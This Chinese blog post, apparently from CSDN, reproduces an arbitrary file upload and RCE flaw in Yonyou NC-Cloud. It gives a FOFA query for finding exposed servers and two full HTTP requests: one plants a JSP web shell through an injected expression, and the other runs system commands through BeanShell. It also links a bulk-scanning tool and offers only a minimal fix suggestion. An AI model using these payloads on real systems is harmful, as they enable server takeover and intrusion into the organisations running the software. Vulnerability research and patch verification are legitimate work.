# 原创
：  漏洞复现--用友NC-Cloud全版本任意文件上传/RCE

# 漏洞复现--用友NC-Cloud全版本任意文件上传/RCE

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

NC Cloud是指用友公司推出的大型企业数字化平台。支持公有云、混合云、专属云的灵活部署模式。该产品最近爆出了全版本的一个文件上传/RCE，攻击者可利用此漏洞直接获得服务器权限。

### 二：漏洞影响版本

全版本

### 三：网络空间测绘查询

fofa：<br/> `app="用友-NC-Cloud"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/b00c1058c9e4ce02b2b4d72cd463cf9c.jpeg"/>

### 四：漏洞复现

1.首页抓包，使用以下POC：

```
POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host: IP
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.622.93 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 250

{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/c0nf1g.jsp"]}

```

这里不知道为什么404，但c0nf1g.jsp上传成功了，后续操作正常<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/e57bad7de255f38e2b802eafe6ef75f3.jpeg"/><br/> 2.POST访问c0nf1g.jsp构造RCE

```
POST /c0nf1g.jsp?error=bsh.Interpreter HTTP/1.1
Host: IP
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.2821.52 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 96

cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("whoami").getInputStream())

```

### 五：批量检测

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/3d2178e3c4637a003f1d6d61464c1b48.jpeg"/><br/> 项目地址：<br/> [https://github.com/MzzdToT/Yongyou_NC_Cloud_upload_rce](https://github.com/MzzdToT/Yongyou_NC_Cloud_upload_rce)

### 六：修复建议

联系厂家发布更新补丁
